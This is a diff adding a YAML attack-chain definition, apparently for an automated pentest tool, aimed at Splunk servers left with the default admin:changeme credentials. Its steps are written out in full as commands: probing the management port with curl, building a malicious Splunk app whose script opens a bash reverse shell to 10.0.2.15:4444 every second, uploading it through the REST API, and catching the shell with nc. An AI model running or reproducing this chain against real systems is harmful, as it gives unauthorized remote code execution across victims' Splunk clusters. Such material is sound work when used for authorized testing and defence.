@@ -1,0 +1,55 @@
+chain_id: splunk_default_creds
+title: "Splunk — admin:changeme default + REST script execution"
+severity: CRITICAL
+tags: [splunk, default-creds, rest, rce]
+
+trigger:
+  any_of:
+    - { banner_pattern: "(?i)splunk" }
+    - { port: 8000 }
+    - { port: 8089 }
+    - { path_pattern: "(?i)/(en-US/account|services)" }
+
+description: |
+  Splunk Enterprise / Free defaults to `admin:changeme` on the management
+  port (8089). Once authenticated, the management REST API lets you
+  upload a custom app whose bin/ scripts run with the splunkd user's
+  permissions on every search head — instant RCE across the cluster.
+
+steps:
+  - id: 1
+    title: "Default-cred probe"
+    command: |
+      curl -k -u admin:changeme https://$VICTIMA:8089/services/server/info?output_mode=json | jq
+
+  - id: 2
+    title: "Build a malicious .tar.gz Splunk app"
+    command: |
+      mkdir -p evil/bin evil/default
+      cat > evil/default/inputs.conf << 'EOF'
+      [script:///bin/bash $SPLUNK_HOME/etc/apps/evil/bin/run.sh]
+      disabled = 0
+      interval = 1
+      sourcetype = pwn
+      EOF
+      cat > evil/bin/run.sh << 'EOF'
+      #!/bin/bash
+      bash -i >& /dev/tcp/10.0.2.15/4444 0>&1
+      EOF
+      chmod +x evil/bin/run.sh
+      tar czf evil.tar.gz -C evil .
+
+  - id: 3
+    title: "Upload + enable the app via REST"
+    command: |
+      curl -k -u admin:changeme -X POST \
+        -F "name=@evil.tar.gz" \
+        -F "filename=true" -F "update=true" \
+        https://$VICTIMA:8089/services/apps/local
+
+  - id: 4
+    title: "Listener + wait one minute for the cron-like inputs.conf to fire"
+    command: nc -lvnp 4444
+
+references:
+  - https://book.hacktricks.xyz/network-services-pentesting/8089-splunkd
